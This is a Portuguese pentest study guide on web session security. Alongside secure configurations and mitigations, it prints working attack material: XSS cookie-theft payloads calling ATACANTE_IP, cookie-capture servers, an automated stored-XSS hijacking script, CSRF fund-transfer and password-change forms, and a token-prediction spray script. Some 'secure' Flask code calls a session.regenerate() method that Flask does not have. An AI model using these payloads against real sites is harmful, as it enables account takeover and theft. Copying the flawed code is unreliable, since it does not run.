---
title: "Session Security"
---

# Session Security

# O que é?

**Sessão** (ou session) é o mecanismo pelo qual aplicações web simulam estado em cima de um protocolo fundamentalmente stateless. O HTTP é um protocolo de requisição-resposta sem memória: cada requisição é completamente independente da anterior. O servidor não tem nenhuma noção inerente de "continuidade" entre requisições do mesmo cliente.

Para contornar essa limitação, inventou-se o conceito de sessão: após o usuário autenticar com sucesso (usuário + senha), o servidor cria uma estrutura de dados server-side associada àquele usuário e gera um identificador aleatório e único — o **session ID** (também chamado de session token). Esse identificador é enviado ao cliente (tipicamente via cookie `Set-Cookie`), e o cliente o devolve em cada requisição subsequente. O servidor, ao receber o session ID, consulta seu armazenamento de sessões e recupera o estado associado a ele.

**A garantia central**: quem possuir o session ID válido é tratado como o usuário autenticado associado a ele. O session ID é a "chave" da sessão.

**Onde o estado de sessão é armazenado (server-side):** a **memória do processo** é a opção mais simples, mas não sobrevive a reinicializações e não escala horizontalmente porque cada instância do servidor mantém sua própria memória isolada. **Redis / Memcached** são a solução mais comum em produção — armazenamento distribuído em memória que permite múltiplas instâncias do servidor compartilhar o mesmo estado de sessão. **Banco de dados relacional** (PostgreSQL, MySQL) oferece durabilidade, mas com latência maior que Redis para leituras frequentes de sessão. **Arquivos no sistema de arquivos** são comuns em aplicações PHP legadas, tipicamente em `/var/lib/php/sessions/`.

**Diferença fundamental entre sessão e JWT:**

| Característica | Session | JWT |
|----------------|---------|-----|
| Estado no servidor | Sim — session store | Não — stateless |
| Revogação imediata | Trivial (deletar do store) | Complexa (blacklist ou esperar expirar) |
| Escalabilidade | Requer session store distribuído | Escala naturalmente |
| Informação no cliente | Apenas o ID opaco | Payload completo (legível) |
| Tamanho do cookie | Pequeno (~32 bytes) | Variável (centenas de bytes) |
| Controle server-side | Total | Limitado |

Sessions são a alternativa clássica ao JWT para aplicações web tradicionais. Em termos de segurança, o controle server-side que as sessions oferecem é uma vantagem significativa: é possível invalidar uma sessão imediatamente em caso de comprometimento, sem depender de expiração de token.

---

# Onde é implementado?

Sessions são o mecanismo de estado padrão em praticamente toda aplicação web server-side. Como pentester, você as encontrará em qualquer sistema que mantém estado de autenticação entre requisições.

**Aplicações web server-side tradicionais**: frameworks como PHP nativo, Ruby on Rails, Django (Python), Express (Node.js), Laravel, Spring Boot (Java) e ASP.NET todos implementam sessões por padrão. Uma aplicação Rails recém-criada já vem com `session` configurado. Uma aplicação Django usa `django.contrib.sessions` por padrão.

**Sistemas bancários e financeiros**: bancos preferem sessions a JWTs porque o controle server-side é crítico. Quando um usuário faz logout ou a sessão é suspeita de comprometimento, o banco pode invalida-la imediatamente no servidor. Com JWT, o token continua válido até expirar. Aplicações de internet banking, corretoras e fintechs reguladas tendem a usar sessions com timeouts agressivos (15-30 minutos de inatividade).

**E-commerce e carrinhos de compras**: o "carrinho de compras" é o exemplo clássico de estado que precisa persistir entre requisições. Sessions permitem manter o carrinho mesmo para usuários não autenticados, associando o carrinho ao session ID antes do login e ao usuário após.

**Portais corporativos e CMSs**: WordPress, Drupal, Joomla, SharePoint — todos usam sessions. Qualquer aplicação desenvolvida em PHP (que ainda representa a maioria dos sites da web) usa `$_SESSION` ou o mecanismo de session do framework.

**Onde você os encontra em pentest:**
- Cookie `PHPSESSID` → aplicação PHP
- Cookie `JSESSIONID` → aplicação Java (Tomcat, JBoss)
- Cookie `session` → Flask, Express, Rails (nome configurável)
- Cookie `ASP.NET_SessionId` → aplicação ASP.NET
- Cookie `django_session` → aplicação Django
- Qualquer cookie com valor hexadecimal longo (32-64 caracteres) ou base64 opaco
- Parâmetro `?sessionid=` em URLs (má prática, mas existe em sistemas legados)

---

# Como funciona de forma adequada?

O ciclo de vida correto de uma sessão segura envolve geração criptograficamente segura do ID, transmissão apenas via HTTPS com flags de proteção, validação em cada requisição, e destruição adequada no logout.

**Diagrama do fluxo completo de sessão segura:**

```
+----------+                                        +----------+          +-------------+
|  Client  |                                        |  Web     |          |  Session    |
| (browser)|                                        |  Server  |          |  Store      |
+----------+                                        +----------+          | (Redis/DB)  |
     |                                                   |                +-------------+
     |  POST /login                                      |                      |
     |  {username: "alice", password: "..."}             |                      |
     |-------------------------------------------------->|                      |
     |                                                   |                      |
     |                                         [valida credenciais no DB]       |
     |                                         [gera session_id via CSPRNG]     |
     |                                         [32 bytes aleatorios = 256 bits] |
     |                                                   |                      |
     |                                                   |  HSET session:abc123 |
     |                                                   |  user_id=42          |
     |                                                   |  created_at=...      |
     |                                                   |  ip=192.168.1.10     |
     |                                                   |--------------------->|
     |                                                   |                      |
     |  HTTP 302 /dashboard                              |                      |
     |  Set-Cookie: SESSIONID=abc123;                    |                      |
     |              HttpOnly;                            |                      |
     |              Secure;                              |                      |
     |              SameSite=Strict;                     |                      |
     |              Path=/;                              |                      |
     |              Max-Age=3600                         |                      |
     |<--------------------------------------------------|                      |
     |                                                   |                      |
     |  GET /dashboard                                   |                      |
     |  Cookie: SESSIONID=abc123                         |                      |
     |-------------------------------------------------->|                      |
     |                                                   |  GET session:abc123  |
     |                                                   |--------------------->|
     |                                                   |  {user_id: 42, ...}  |
     |                                                   |<---------------------|
     |                                                   |                      |
     |                                         [autoriza requisicao]            |
     |                                         [serve conteudo do usuario 42]   |
     |  HTTP 200 {dados do dashboard}                    |                      |
     |<--------------------------------------------------|                      |
     |                                                   |                      |
     |  POST /logout                                     |                      |
     |  Cookie: SESSIONID=abc123                         |                      |
     |-------------------------------------------------->|                      |
     |                                                   |  DEL session:abc123  |
     |                                                   |--------------------->|
     |                                                   |  [sessao destruida]  |
     |  HTTP 302 /login                                  |                      |
     |  Set-Cookie: SESSIONID=; Max-Age=0                |                      |
     |<--------------------------------------------------|                      |
```

**Atributos do cookie e o que cada um protege:**

| Atributo | O que protege | Como funciona |
|----------|---------------|---------------|
| `HttpOnly` | Roubo via JavaScript (XSS) | Browser não expõe o cookie via `document.cookie` |
| `Secure` | Interceptação em trânsito | Cookie só é enviado em conexões HTTPS |
| `SameSite=Strict` | CSRF completo | Cookie não é enviado em requisições cross-site |
| `SameSite=Lax` | CSRF via POST cross-site | Cookie enviado apenas em navegação top-level GET |
| `SameSite=None` | Nenhuma proteção CSRF | Necessário para cookies third-party legítimos |
| `Path=/` | Escopo do cookie | Cookie enviado apenas para paths correspondentes |
| `Max-Age=3600` | Sessão eterna | Cookie expira após 1 hora mesmo sem logout |
| `Domain` | Escopo de domínio | Define para quais domínios o cookie é enviado |

**Implementação correta em Python (Flask):**
```python
import secrets
import redis
from flask import Flask, session, request, redirect, abort
from datetime import timedelta

app = Flask(__name__)

# Configuracao de seguranca do cookie de sessao
app.config.update(
    SECRET_KEY=secrets.token_hex(32),          # chave de assinatura do cookie
    SESSION_COOKIE_SECURE=True,                # apenas HTTPS
    SESSION_COOKIE_HTTPONLY=True,              # sem acesso JavaScript
    SESSION_COOKIE_SAMESITE='Strict',          # protecao CSRF
    SESSION_COOKIE_NAME='sid',                 # nome nao revela tecnologia
    PERMANENT_SESSION_LIFETIME=timedelta(hours=1),
)

# Session store externo (Redis)
r = redis.Redis(host='localhost', port=6379, db=0)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    usuario = autenticar_usuario(username, password)
    if not usuario:
        return redirect('/login?erro=invalido')

    # CRITICO: gerar novo session ID apos autenticacao bem-sucedida
    # Isso previne session fixation
    novo_session_id = secrets.token_urlsafe(32)   # 256 bits de entropia

    # Armazenar dados no Redis com TTL
    dados_sessao = {
        'user_id': usuario.id,
        'username': usuario.username,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', ''),
    }
    r.hset(f'session:{novo_session_id}', mapping=dados_sessao)
    r.expire(f'session:{novo_session_id}', 3600)  # expira em 1 hora

    response = redirect('/dashboard')
    response.set_cookie(
        'sid',
        novo_session_id,
        httponly=True,
        secure=True,
        samesite='Strict',
        max_age=3600,
    )
    return response

@app.route('/logout')
def logout():
    session_id = request.cookies.get('sid')
    if session_id:
        # CRITICO: destruir sessao no servidor, nao apenas no cliente
        r.delete(f'session:{session_id}')

    response = redirect('/login')
    # Expirar o cookie no cliente tambem
    response.set_cookie('sid', '', max_age=0, httponly=True, secure=True, samesite='Strict')
    return response

def obter_sessao_atual():
    session_id = request.cookies.get('sid')
    if not session_id:
        abort(401)

    dados = r.hgetall(f'session:{session_id}')
    if not dados:
        abort(401)  # sessao inexistente ou expirada

    # Validacao adicional: verificar IP e User-Agent
    ip_atual = request.remote_addr
    if dados.get(b'ip', b'').decode() != ip_atual:
        # IP mudou — possivel session hijacking
        r.delete(f'session:{session_id}')
        abort(401)

    return dados
```

**Implementação correta em Node.js (Express + express-session):**
```javascript
const express = require('express');
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');
const crypto = require('crypto');

const app = express();
const redisClient = createClient();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,  // minimo 256 bits de entropia
  name: 'sid',                         // nome nao revela tecnologia
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,     // sem acesso JavaScript
    secure: true,       // apenas HTTPS
    sameSite: 'strict', // protecao CSRF
    maxAge: 3600000,    // 1 hora em milissegundos
  },
}));

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const usuario = await autenticarUsuario(username, password);

  if (!usuario) {
    return res.redirect('/login?erro=invalido');
  }

  // Regenerar session ID apos autenticacao (previne session fixation)
  req.session.regenerate((err) => {
    if (err) return res.status(500).send('Erro interno');

    req.session.userId = usuario.id;
    req.session.username = usuario.username;
    req.session.createdAt = Date.now();

    req.session.save(() => res.redirect('/dashboard'));
  });
});

app.post('/logout', (req, res) => {
  req.session.destroy((err) => {    // destroi no servidor (Redis)
    res.clearCookie('sid');          // remove cookie do cliente
    res.redirect('/login');
  });
});
```

**Boas práticas resumidas:**

1. **Geração com CSPRNG**: nunca usar `rand()`, timestamp, ou combinações previsíveis. Usar `secrets.token_urlsafe(32)` (Python) ou `crypto.randomBytes(32)` (Node.js).

2. **Regeneração após login**: sempre gerar um novo session ID após autenticação bem-sucedida. O session ID pré-login (não autenticado) jamais deve ser reutilizado pós-login — isso previne session fixation.

3. **Timeout de inatividade**: sessões devem expirar após período de inatividade (15-60 minutos para dados sensíveis). O TTL deve ser resetado a cada requisição válida.

4. **Invalidação no logout**: o session ID deve ser destruído no servidor no logout. Apenas deletar o cookie no cliente deixa o token válido no servidor — um atacante que capturou o cookie ainda pode usá-lo.

5. **Flags de cookie**: `HttpOnly` + `Secure` + `SameSite=Strict` são o mínimo. Nenhuma dessas flags é ativada automaticamente em todos os frameworks — é preciso configurar explicitamente.

---

## A Falha: Identificadores de Sessão Previsíveis, Roubáveis ou Não Invalidados

O mecanismo de sessão existe para contornar uma limitação fundamental do HTTP: o protocolo é stateless. Cada requisição HTTP é independente — o servidor não tem memória inerente de quem fez a requisição anterior. A sessão resolve isso: após a autenticação, o servidor gera um identificador único (session ID), armazena-o em um cookie, e toda requisição subsequente apresenta esse token para provar que é o mesmo usuário que fez login.

A garantia de segurança da sessão é inteiramente dependente da qualidade do session ID: ele precisa ser aleatório o suficiente para não ser adivinhado, protegido do transporte para não ser interceptado, e invalidado quando a sessão termina.

**Perspectiva do desenvolvedor**: ao usar um framework, o gerenciamento de sessão parece "resolvido" — o framework gera o token, o browser envia automaticamente. O desenvolvedor frequentemente foca na lógica de negócio e não questiona a configuração padrão dos cookies de sessão. As vulnerabilidades emergem quando:

- O framework usa um gerador de números aleatórios previsível (tokens sequenciais como `session_1001`, `session_1002`)
- O token é gerado com dados previsíveis (timestamp + userId hash)
- Os cookies não têm flags de segurança (`HttpOnly`, `Secure`, `SameSite`)
- O servidor não gera um novo token no login (session fixation possível)
- O logout apaga o cookie no cliente mas não invalida o token no servidor

Um exemplo concreto: a aplicação Flask usa `jwt.decode(token, verify=False)`, o que significa que qualquer usuário pode modificar o campo `username` no payload do JWT para `john.smith` e acessar as transações bancárias desse usuário — o servidor nunca valida o token. Nesse caso, o "session token" (JWT) não tem integridade.

**Impacto real**: account takeover direto — obter o session token de um usuário é equivalente a ter suas credenciais para aquela sessão. CSRF força o browser da vítima a executar ações autenticadas sem seu consentimento.

---

## Causa Raiz

### Sessão Fraca: o Token Não É Suficientemente Aleatório

```python
# VULNERAVEL: session ID previsivel
import time, hashlib

def create_session(user_id):
    # Baseado em timestamp e user_id - previsivel!
    raw = f"{user_id}{int(time.time())}"
    session_id = hashlib.md5(raw.encode()).hexdigest()
    return session_id

# Token para user 42, às 17:00:00 = md5("421714000000") = fixo, sem entropia
```

```python
# SEGURO: token com alta entropia
import secrets

def create_session(user_id):
    # 32 bytes aleatorios via CSPRNG = 256 bits de entropia
    session_id = secrets.token_urlsafe(32)
    store_session(session_id, user_id)
    return session_id
```

### Session Fixation: Servidor Não Gera Novo ID no Login

```python
# VULNERAVEL: mesmo session ID antes e depois do login
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    if authenticate(username, password):
        # PROBLEMA: session['user'] é definido mas o session ID nao muda
        session['user'] = username
        return redirect('/dashboard')

# Ataque:
# 1. Atacante acessa /login (recebe session_id=KNOWN)
# 2. Atacante envia link com session fixado para vitima: /login?session=KNOWN
# 3. Vitima faz login → servidor associa KNOWN ao usuario autenticado
# 4. Atacante acessa /dashboard com session=KNOWN → autenticado como vitima
```

```python
# SEGURO: regenerar session ID apos autenticacao
from flask import session

@app.route('/login', methods=['POST'])
def login():
    if authenticate(request.form['username'], request.form['password']):
        # Invalida sessao anterior e gera novo ID
        old_data = dict(session)
        session.clear()
        session.regenerate()  # novo ID
        session.update(old_data)
        session['user'] = request.form['username']
        return redirect('/dashboard')
```

### Logout Inseguro: Cookie Deletado, Token Não Invalidado

```python
# VULNERAVEL: logout apenas no cliente
@app.route('/logout')
def logout():
    response = redirect('/login')
    response.delete_cookie('session')  # remove cookie do browser
    return response
    # PROBLEMA: o session_id ainda existe no servidor
    # Um atacante que capturou o cookie antes do logout pode continuar usando
```

```python
# SEGURO: invalidar no servidor
@app.route('/logout')
def logout():
    session_id = request.cookies.get('session')
    if session_id:
        delete_session_from_db(session_id)  # invalida no servidor
    response = redirect('/login')
    response.delete_cookie('session')
    return response
```

---

## Como o Ataque Funciona

### Session Token — O Que Deve Ser

Um session token seguro deve ser:
- **Aleatório**: sem relação com userId, timestamp, ou qualquer dado previsível
- **Longo**: mínimo 128 bits de entropia
- **Único**: nunca reutilizado entre sessões
- **Não transmitido via GET**: nunca em URLs (ficam em logs, referer, histórico)

### Onde Tokens São Armazenados

```
Cookie: session=AbcDef123...
Authorization: Bearer JWT_TOKEN
URL: /app?token=INSECURE

# Flags de cookie importantes:
Set-Cookie: session=token; HttpOnly; Secure; SameSite=Strict; Path=/
```

| Flag | Proteção |
|------|----------|
| HttpOnly | Previne acesso via JavaScript (mitigação de XSS) |
| Secure | Transmitido apenas via HTTPS |
| SameSite=Strict | Previne envio em requests cross-site (CSRF) |
| SameSite=Lax | Previne em POST cross-site, permite GET |
| SameSite=None | Sem proteção CSRF |

---

## Discovery / Identificação

### Análise de Tokens de Sessão

```bash
# Coletar multiplos tokens e analisar entropia
for i in {1..10}; do
    curl -s -c - "http://alvo.com/login" \
         -d "user=test&pass=test" | grep session
done

# Verificar previsibilidade — tokens sequenciais?
# Token1: session_1001
# Token2: session_1002
# Completamente previsivel!

# Testar se token e baseado em tempo
# Converter para timestamp e verificar correlacao
python3 -c "
import time, base64
token = 'c2Vzc2lvbl8x'
print(base64.b64decode(token))
"
```

### Identificar Vulnerabilidades de Cookie

```bash
# Verificar flags de seguranca do cookie
curl -s -I "http://alvo.com/login" | grep -i "set-cookie"

# Esperado seguro:
# Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict

# Inseguro (sem flags):
# Set-Cookie: session=xxx
```

### Burp Suite — Session Token Analysis

1. Burp → Sequencer → Live Capture
2. Fazer login múltiplas vezes capturando cookies
3. Analyze → verificar nível de entropia
4. Tokens com entropia baixa são previsíveis

---

## Exploitation

### 1. Session Hijacking via XSS

O ataque mais comum: roubar cookie via JavaScript se `HttpOnly` estiver ausente.

```javascript
// Payload XSS para roubo de cookie
<script>
fetch('http://ATACANTE_IP/steal?c=' + document.cookie)
</script>

// Via img tag (mais compativel)
<img src=x onerror="fetch('http://ATACANTE_IP/?c='+document.cookie)">

// Via location redirect
<script>document.location='http://ATACANTE_IP/?c='+document.cookie</script>

// XMLHttpRequest
<script>
var x = new XMLHttpRequest();
x.open('GET', 'http://ATACANTE_IP/?c=' + document.cookie);
x.send();
</script>
```

**Capturar no lado do atacante**:
```bash
# Python HTTP server simples para capturar cookies
python3 -c "
import http.server, urllib.parse

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print('[+] Cookie recebido:', self.path)
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args): pass

http.server.HTTPServer(('0.0.0.0', 80), Handler).serve_forever()
"
```

```bash
# Netcat simples
nc -lnvp 80
```

**Usar cookie roubado**:
```bash
# Com curl
curl -s "http://alvo.com/admin" \
     -H "Cookie: session=COOKIE_ROUBADO"

# No browser: DevTools → Application → Cookies → editar valor
```

### 2. Session Fixation

Atacante define um session ID antes do login → vítima faz login → token não muda → atacante usa o token fixado.

```bash
# Passo 1: Obter um session token (sem autenticar)
curl -s -c cookies.txt "http://alvo.com/" -b "session=FIXED_SESSION_ID"

# Passo 2: Criar link com session ID fixado
http://alvo.com/login?sessionid=FIXED_SESSION_ID

# Passo 3: Entregar link para vitima
# Vitima faz login → se aplicacao nao rotacionar o token → atacante usa FIXED_SESSION_ID

# Passo 4: Acessar como vitima
curl -s "http://alvo.com/dashboard" \
     -H "Cookie: session=FIXED_SESSION_ID"
```

**Indicador de vulnerabilidade**: token NÃO muda após login bem-sucedido.

### 3. CSRF (Cross-Site Request Forgery)

Forçar o browser da vítima a enviar requests autenticados para o alvo sem consentimento.

**Payload CSRF básico** (hospedado em site do atacante):
```html
<!-- CSRF GET -->
<img src="http://alvo.com/transfer?amount=1000&to=attacker" width="0" height="0">

<!-- CSRF POST -->
<form id="csrf" action="http://alvo.com/transfer" method="POST">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to" value="attacker">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- CSRF com fetch (precisa de CORS misconfiguration) -->
<script>
fetch('http://alvo.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'amount=1000&to=attacker'
})
</script>
```

**CSRF XHR (XMLHttpRequest)**:
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://alvo.com/change_email');
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.send('email=attacker@evil.com');
</script>
```

**CSRF para mudar senha**:
```html
<html>
<body onload="document.forms[0].submit()">
<form action="http://alvo.com/change_password" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>
</body>
</html>
```

### 4. XSS Stored para CSRF Chaining

Combinar XSS armazenado com CSRF para contornar proteções de SameSite:

```javascript
// XSS stored que faz CSRF para adicionar usuario admin
<script>
// Primeiro, obter token CSRF da pagina
fetch('/admin/settings', {credentials: 'include'})
.then(r => r.text())
.then(html => {
    // Extrair CSRF token do HTML
    var token = html.match(/csrf_token[^>]*value="([^"]+)"/)[1];
    
    // Executar request autenticado com token CSRF correto
    fetch('/admin/add_user', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'username=attacker&role=admin&csrf=' + token
    });
})
</script>
```

### 5. Open Redirect para Session Hijacking

Combinar open redirect com roubo de token:

```bash
# Se alvo tem open redirect:
# http://alvo.com/redirect?url=https://evil.com

# E a aplicacao coloca token na URL durante redirect:
# http://alvo.com/auth?return_to=http://alvo.com/redirect?url=https://evil.com

# Token vai no referer ou na URL quando redireciona para evil.com
# evil.com pode capturar o token do Referer header ou URL fragment
```

### 6. CORS Misconfiguration para Session Hijacking

```bash
# Verificar se CORS aceita origens arbitrarias
curl -s -H "Origin: https://evil.com" \
     -H "Cookie: session=VALIDO" \
     "http://alvo.com/api/me" \
     -v 2>&1 | grep -i "access-control"

# Se resposta tem:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
# → CORS misconfiguration exploravel
```

**Payload de exploiting CORS**:
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://alvo.com/api/data', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        fetch('http://ATACANTE_IP/?data=' + encodeURIComponent(xhr.responseText));
    }
};
xhr.send();
</script>
```

---

## Bypass de Proteções

### Bypass de CSRF Token

```bash
# 1. Testar se token e verificado (remover completamente)
# 2. Testar se qualquer valor funciona (backend nao verifica)
# 3. Testar token de outra sessao (nao vinculado a sessao?)
# 4. Testar token de outro usuario (compartilhado?)

# Se a aplicacao usa o MESMO token para todos os usuarios:
# Login com propria conta → obter CSRF token → usar em CSRF contra vitima
```

### Bypass de SameSite via Subdomain

Se um subdomínio do alvo tem XSS, SameSite=Lax não protege:

```javascript
// XSS em sub.alvo.com → requisicao para alvo.com vai com cookies
// porque e same-site (mesmo dominio eTLD+1)
fetch('http://alvo.com/api/transfer', {
    credentials: 'include',
    method: 'POST',
    body: 'amount=1000&to=attacker'
})
```

### Bypass de Referer Check

```html
<!-- Hospedar em alvo.com.evil.com -->
<!-- URL que contem o dominio alvo -->

<!-- Ou usar meta referrer policy -->
<meta name="referrer" content="no-referrer">
<form action="http://alvo.com/transfer" method="POST">
    <!-- Referer nao sera enviado -->
</form>
```

---

## Automação

### Script Python para Session Hijacking via XSS

```python
import http.server
import urllib.parse
import threading
import requests

# Servidor para capturar cookies
cookies_capturados = []

class CookieHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        if 'c' in params:
            cookie = params['c'][0]
            cookies_capturados.append(cookie)
            print(f"[+] Cookie capturado: {cookie}")
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args): pass

# Iniciar servidor em background
server = http.server.HTTPServer(('0.0.0.0', 8080), CookieHandler)
t = threading.Thread(target=server.serve_forever)
t.daemon = True
t.start()
print("[*] Servidor de captura rodando na porta 8080")

# Injetar XSS via comment ou outro vetor
payload_xss = "<script>fetch('http://ATACANTE_IP:8080/?c='+document.cookie)</script>"
requests.post("http://alvo.com/comment", 
              data={"content": payload_xss},
              cookies={"session": "minha_sessao"})

# Esperar cookie
import time
time.sleep(10)
if cookies_capturados:
    print(f"[+] Usando cookie: {cookies_capturados[0]}")
    r = requests.get("http://alvo.com/admin",
                    cookies={"session": cookies_capturados[0]})
    print(r.text[:500])
```

---

## Detecção e Mitigação

### Verificações Essenciais

```bash
# 1. Session nao rotaciona apos login (fixation)
# Login → verificar se token mudou

# 2. Token em URL
grep -E "sessionid=|session=|PHPSESSID=" /var/log/apache2/access.log

# 3. Falta de HttpOnly
curl -s -I "http://alvo.com/login" -d "user=test&pass=test" | grep -i "httponly"

# 4. Token em requisicoes GET
grep "GET.*session=" /var/log/apache2/access.log
```

### Implementação Segura de Sessão

O que o desenvolvedor precisa fazer explicitamente — nenhuma dessas proteções é automática:

```python
# Django — configuracao segura de sessao
SESSION_COOKIE_SECURE = True       # apenas HTTPS
SESSION_COOKIE_HTTPONLY = True     # sem acesso JS
SESSION_COOKIE_SAMESITE = 'Strict' # sem CSRF
SESSION_COOKIE_AGE = 3600          # 1 hora
SESSION_EXPIRE_AT_BROWSER_CLOSE = True

# Rotacionar token apos login (Python/Flask)
from flask import session
session.regenerate()  # gerar novo ID apos login
```

**Prevenção de CSRF**:
- Synchronizer Token Pattern: token aleatório por sessão, enviado em forms, verificado server-side
- Double Submit Cookie: token aleatório em cookie + parâmetro (sem estado no servidor)
- SameSite Cookie Attribute: `SameSite=Strict` para operações sensíveis
- Verificação de Referer header como defesa secundária
- CORS configurado apenas para origens confiáveis

**Prevenção de Session Hijacking**:
- `HttpOnly` em todos os session cookies — sem exceção
- `Secure` flag para HTTPS-only
- Session timeout agressivo para dados sensíveis (15-60 min)
- Invalidar sessão no servidor no logout (não apenas apagar cookie)
- Regenerar ID de sessão após login (previne session fixation)
- Associar sessão a User-Agent e IP como check secundário

**Prevenção de Session Fixation**:
- Sempre gerar novo session ID após autenticação bem-sucedida
- Nunca aceitar session IDs fornecidos via URL ou parâmetro (`?sessionid=`)
- Validar que o session ID foi gerado pelo servidor, não pelo cliente

---

---

## Weak PRNG — Previsão de Token por Timing Attack (AWAE Ch.9 — openCRX)

### Padrão Vulnerável

```java
// VULNERÁVEL — semente previsível
Random rnd = new Random(System.currentTimeMillis());
String token = Long.toString(Math.abs(rnd.nextLong()), 36);

// SEGURO
SecureRandom rnd = new SecureRandom();
```

`java.util.Random` é um PRNG linear congruente — 100% determinístico a partir da semente. Se a semente é o timestamp em milissegundos no momento da requisição, um atacante que saiba *quando* a requisição ocorreu pode reproduzir exatamente a mesma sequência de valores.

### Identificação

```bash
# descompilar JAR/WAR e buscar padrão
jar -xf app.war
find . -name "*.class" | xargs grep -l "Random" 2>/dev/null
# usar JD-GUI para descompilar as classes encontradas
# buscar: "new Random(" sem "Secure" antes
```

### Ataque em 3 Etapas

**Etapa 1 — Medir janela temporal**

```bash
# registrar timestamps antes e depois do POST de password reset
date +%s%3N   # START (ms Unix epoch)
curl -s -X POST http://TARGET/reset -d "email=victim@target.com"
date +%s%3N   # END (ms Unix epoch)
# janela típica: 300–500ms = 300–500 seeds possíveis
```

**Etapa 2 — Gerar todos os tokens da janela**

```java
// TokenGenerator.java — replica lógica exata do app alvo
import java.util.Random;
public class TokenGenerator {
    public static void main(String[] args) {
        long start = Long.parseLong(args[0]);
        long end   = Long.parseLong(args[1]);
        for (long seed = start; seed <= end; seed++) {
            Random rnd = new Random(seed);
            String token = Long.toString(Math.abs(rnd.nextLong()), 36);
            System.out.println(token);
        }
    }
}
```

```bash
javac TokenGenerator.java
java TokenGenerator START END > tokens.txt
wc -l tokens.txt   # deve ser ~300-500 tokens
```

**Etapa 3 — Spray**

```python
# spray_tokens.py
import requests

with open('tokens.txt') as f:
    tokens = f.read().splitlines()

for token in tokens:
    r = requests.post('http://TARGET/confirm-reset',
                      data={'token': token, 'password': 'NewPass123!'})
    if 'invalid' not in r.text.lower() and 'error' not in r.text.lower():
        print(f"[+] Token válido: {token}")
        break
```

### Variações de Seed Previsível

| Seed | Previsibilidade |
|------|----------------|
| `System.currentTimeMillis()` | Janela de ms — spray viável |
| Timestamp em segundos | Apenas 1-2 seeds — trivial |
| ID de usuário (inteiro) | Espaço pequeno — brute viável |
| `new Random()` sem seed | Usa nanoTime internamente — ainda previsível em alguns JVMs |

---

## Cheatsheet Rápido

| Ataque | Payload/Técnica |
|--------|----------------|
| XSS cookie theft | `<script>fetch('http://ATK/?c='+document.cookie)</script>` |
| Session fixation | Definir cookie antes do login, verificar se rotaciona |
| CSRF GET | `<img src="http://alvo.com/action?param=value">` |
| CSRF POST | Form hidden + JS submit automático |
| CSRF bypass (sem token) | Remover token da requisição |
| CORS exploit | xhr.withCredentials=true + fetch para domínio vulnerável |
| SameSite bypass | XSS em subdomínio do alvo |
| Open redirect chain | redirect?url=attacker.com para capturar tokens em URL |

---

## Módulos Relacionados

Session security é o elo que conecta a autenticação ao controle de acesso contínuo. O módulo de **Brute Force/Broken Auth** (`01_brute_force_e_broken_auth.md`) é o antecessor direto: session fixation pressupõe que o atacante pode induzir a vítima a fazer login numa sessão controlada, enquanto brute force produz o mesmo resultado de account takeover por caminho diferente. **JWT Attacks** (`02_jwt_attacks.md`) cobre o cenário em que JWT substitui o session cookie — as garantias de segurança buscadas são análogas (controle de identidade por requisição), mas as vulnerabilidades são distintas. O módulo de **XSS** é o vetor de exploração mais direto: XSS em cookies sem `HttpOnly` resulta em session hijacking automático via `document.cookie`. O módulo de **CSRF** é o complemento natural: CSRF explora a sessão ativa da vítima para executar ações não autorizadas sem precisar roubar o token. As referências externas são HTB Bug Bounty Hunter Path — Session Security (módulo 17), OWASP Session Management Cheat Sheet, OWASP CSRF Prevention Cheat Sheet, PortSwigger Web Security Academy — Session vulnerabilities, e SameSite cookies explained (https://web.dev/samesite-cookies-explained/).
